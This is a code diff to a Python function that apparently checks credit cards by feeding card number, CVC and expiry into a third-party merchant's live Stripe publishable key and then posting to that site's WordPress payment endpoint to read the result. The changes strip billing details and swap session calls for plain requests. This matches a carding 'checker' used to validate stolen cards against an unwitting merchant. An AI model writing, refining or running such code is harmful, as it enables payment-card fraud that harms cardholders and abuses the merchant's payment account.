@@ -33,9 +33,9 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&billing_details[name]=Rodam+User&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ffb705f34aa%3B+stripe-js-v3%2Ffb705f34aa%3B+card-element&referrer=https%3A%2F%2Filfmedia.com&time_on_page=58989&key=pk_live_51Htc78EWFvJhVVegTITTsLS0bGqqbu0gOSJdWifr2kxWX8mkJNNZmcOuRDWBk6ZYNWB2u92PatJXwwm4ZUi8l7qt00vUozeEge'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Ffb705f34aa%3B+stripe-js-v3%2Ffb705f34aa%3B+card-element&key=pk_live_51Htc78EWFvJhVVegTITTsLS0bGqqbu0gOSJdWifr2kxWX8mkJNNZmcOuRDWBk6ZYNWB2u92PatJXwwm4ZUi8l7qt00vUozeEge'
 	
-	response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
@@ -68,7 +68,7 @@ def Tele(ccx):
 	    'wpfs-stripe-payment-method-id': pm,
 	}
 	
-	response = session.post('https://ilfmedia.com/wp-admin/admin-ajax.php', headers=headers, data=data)
+	response = requests.post('https://ilfmedia.com/wp-admin/admin-ajax.php', headers=headers, data=data)
 	
 	result = re.search('"message":"(.*?)"', response.text).group(1)
 		
